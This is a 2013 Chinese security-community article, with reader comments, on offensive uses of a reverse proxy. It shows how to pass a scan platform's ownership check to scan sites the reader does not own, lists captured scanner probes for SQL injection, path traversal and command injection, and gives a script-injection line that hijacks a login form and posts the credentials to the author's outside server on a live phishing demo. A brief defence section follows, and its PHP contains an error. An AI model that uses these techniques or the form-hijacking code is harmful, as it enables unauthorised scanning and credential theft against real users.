<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">反向代理的有趣用法</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">VIP</a> <span class="bull">·</span> <time title="2013/08/27 10:53" ui-time="" datetime="2013/08/27 10:53" class="published ng-binding ng-isolate-scope">2013/08/27 10:53</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 简介</h2><hr><p>首先请各位客官看这里:<a href="http://viptest.yupage.com">http://viptest.yupage.com</a></p><p>这便是一个使用开源程序7ghost搭建的反向代理演示站。</p><p>反向代理，是指反向代理服务器从目标内容服务器上抓取内容返回给用户，反向代理服务器充当了一个中介的功能，它本身是没有任何内容的。整个流程如下：</p><p><img alt="2013081909582854868.jpg" img-src="66af1417243e3e5740e0ec83540de22157ac0c25.jpg"></p><p>整个流程非常简单，只需要负责映射请求的.htaccess和负责抓取内容的index.php就可完成，中间还可以通过正则表达式等实现内容和网址的替换。</p><p>这种技术还广泛运用于小偷程序中。</p><h2>0x01 用反向代理让漏洞检测平台帮我们扫漏洞</h2><hr><p>现在有一些在线漏洞检测平台（如360 安全宝等），都能让我们对目标网站的安全状况有一个初步的了解。但是，这些漏洞检测平台都是需要验证所有权的，那么，我们能不能绕过这个限制呢？反向代理能解决这个问题。</p><p>首先，使用设置好反向代理的目标（如wooyun.org），然后将我们配置好了反向代理程序的网址输入到漏洞检测平台，选取代码验证方式，在我们的核心中转页面（index.php）中插入这段代码，就能够通过漏洞扫描平台的验证，扫目标站的漏洞了。</p><h2>0x02 搭建一个“蜜罐”来抓取漏洞扫描平台的扫描语句</h2><hr><p>各个在线漏洞扫描平台都看上去非常高端洋气国际化的样子，那么，它们是怎么扫描的呢？可以使用反向代理来抓扫描语句。</p><p>首先，在index.php核心中转文件中加入一段代码，将所有请求记录到log.txt中</p><pre><code>#!php
$data = $_SERVER['REQUEST_URI'] . "\n";
if ($_POST) {
    foreach ($_POST as $key =&gt; $value) {
        $data.= "$key=$value" . '\n';
    }
}
file_put_contents("log.txt", $data, FILE_APPEND);
</code></pre><p>然后将搭建好的“蜜罐”丢给360漏洞扫描平台扫描，大约1个小时后，去看看log.txt，已经记录下了上千条扫描日志，由于日志太长，无法全部贴上来，选取几条有代表性的贴上来，并注释了一下可能的用途，全部日志请在<a href="http://viptest.yupage.com/log.txt">http://viptest.yupage.com/log.txt</a>查看。</p><pre><code>/index.php 用蜘蛛从主页层层抓取页面
/akjkl678686hjhjk/ 抓取404页面标识
/admin/ 扫描后台地址
/backup/ 找备份
/bugs/new_confirm/phpmyadmin/ 找phpmyadmin空口令
/crossdomain.xml 看有没有flash跨域限制
/bugs/new_submit/fckeditor/upload/ 找有漏洞的编辑器
/examples/jsp/cal/cal2.jsp?time= 检测XSS
/job.php?action=list%27and%28123%29%3D%27321 扫描SQL注射
/?&amp;redirect:%25{13579246-1} 扫Struts2
/bugs/phpinfo.php 扫phpinfo
/job.php?action=../../../../../../../../../../../../boot.ini%00.htm 扫任意文件读取
/user.php?action=login%7Cping+-n+12+127.0.0.1 扫命令执行
</code></pre><p>除此之外，还大量扫描了一些不存在的页面，如/bugs/new_unclaimed/fckeditor/ajkljlhjh/，不知道有何用意。</p><h2>0x03 钓鱼</h2><hr><p>由于所有经过反向代理服务器的页面都可以控制，所以我们也可以利用此进行钓鱼。请各位看这里：<a href="http://viptest.yupage.com/user.php?action=login">http://viptest.yupage.com/user.php?action=login</a></p><p>我使用正则表达式在该页面中插入了一段这样的代码</p><pre><code>&lt;script src="http://pujun.li/xss.js"&gt;&lt;/script&gt;&lt;script&gt;xss.xform(document.forms[1],'http://vip.yupage.com/wy.php');&lt;/script&gt;
</code></pre><p>使用了长短短的表单劫持代码，这样如果用户在我的演示站登录乌云帐号时就会自动把乌云帐号发送到我的一个接受页面，而还是能正常登录的。除此之外，由于所有经过反向代理服务器的页面都可以控制，我们还可以做很多事，如在页面中动态插入一个xsser.me盗cookies等。</p><h2>0x04 如何防止被反向代理</h2><hr><p>看完了反向代理的危害后，如何防止自己的站被反向代理呢？有一段代码能够较好地防止被反向代理</p><p>.htaccess:</p><pre><code>RewriteEngine On RewriteBase / php_value auto_append_file proxy.php proxy.php:
</code></pre><p><br></p><pre><code>#!php
&lt;?php  
    if ((getenv("HTTP_X_FORWARDED_FOR")!="")&amp;&amp;($getenv("HTTP_HOST")!="wooyun.org")){  
        exit();  
    }  
?&gt;
</code></pre><p>实际上XFF头完全可以伪造，此方法并不能完全防御住~</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/870" rel="bookmark" id="re1">hackyou2014 CTF web关卡通关攻略</a></li><li><a href="http://drops.wooyun.org/tips/8638" rel="bookmark" id="re2">通过.PAC进行网络钓鱼</a></li><li><a href="http://drops.wooyun.org/tips/7679" rel="bookmark" id="re3">php比较操作符的安全问题</a></li><li><a href="http://drops.wooyun.org/papers/155" rel="bookmark" id="re4">CSRF简单介绍及利用方法</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我要上黄网</span> <span class="reply-time">2016-06-07 07:08:24</span></div><p></p><p>思路很好。赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">imlonghao</span> <span class="reply-time">2015-06-09 13:09:46</span></div><p></p><p>@jeary 反代Nginx也就6行代码的事情把</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">無情</span> <span class="reply-time">2014-10-28 10:23:21</span></div><p></p><p>.net 已经封装了的有何好的办法呀？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">cosmetic dentistry grants uk</span> <span class="reply-time">2014-09-21 14:16:58</span></div><p></p><p><strong>cosmetic dentistry grants uk...</strong></p><p>反向代理的有趣用法 | WooYun知识库...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">1428666</span> <span class="reply-time">2014-01-21 18:51:50</span></div><p></p><p>有没有如何搭建反向代理的文章个？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">jeary</span> <span class="reply-time">2013-11-08 11:10:15</span></div><p></p><p>求搭建反代详细教程。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">龙臣</span> <span class="reply-time">2013-10-21 15:16:42</span></div><p></p><p>实际上XFF头完全可以伪造，此方法并不能完全防御住~//欲练此功，必先自宫。如若自宫，未必成功。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sky</span> <span class="reply-time">2013-09-16 12:17:25</span></div><p></p><p>我看看有没有源码</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">wals</span> <span class="reply-time">2013-09-11 16:40:04</span></div><p></p><p>好吧，刚Google到viptest.yunpage.com还以为是山寨站呢</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">艾特绅</span> <span class="reply-time">2013-08-31 23:32:36</span></div><p></p><p>有源码 没管理平台的账号 怎么破 - -</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">艾特绅</span> <span class="reply-time">2013-08-31 23:32:21</span></div><p></p><p>@小沛 有源码 没管理平台的账号 怎么破 - -</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">假面，</span> <span class="reply-time">2013-08-29 10:13:23</span></div><p></p><p>不知道新狗拦不拦截 数字公司跟安全宝的扫描~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小沛</span> <span class="reply-time">2013-08-28 22:17:45</span></div><p></p><p>@vip 求份7Ghost 2 的源码</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小沛</span> <span class="reply-time">2013-08-28 18:22:06</span></div><p></p><p>感谢分享。 楼主真的未满18岁吗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">plt</span> <span class="reply-time">2013-08-28 15:31:57</span></div><p></p><p>好洋气。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">爱上平顶山</span> <span class="reply-time">2013-08-28 11:30:08</span></div><p></p><p>恩嫩谔谔</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Crackkay</span> <span class="reply-time">2013-08-28 11:16:38</span></div><p></p><p>谢谢分享，学习到了！感谢！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ziwen</span> <span class="reply-time">2013-08-28 09:08:05</span></div><p></p><p>流b</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">红帽子</span> <span class="reply-time">2013-08-28 08:25:28</span></div><p></p><p>感觉无法防御</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三十度</span> <span class="reply-time">2013-08-27 16:30:36</span></div><p></p><p>好厉害的赶脚</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">围剿</span> <span class="reply-time">2013-08-27 14:53:20</span></div><p></p><p>又学到好东西了，感谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">萧然</span> <span class="reply-time">2013-08-27 14:51:07</span></div><p></p><p>这个好！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">momo</span> <span class="reply-time">2013-08-27 13:13:40</span></div><p></p><p>又学到了一些。</p><p></p></div></div></div></div></div></main>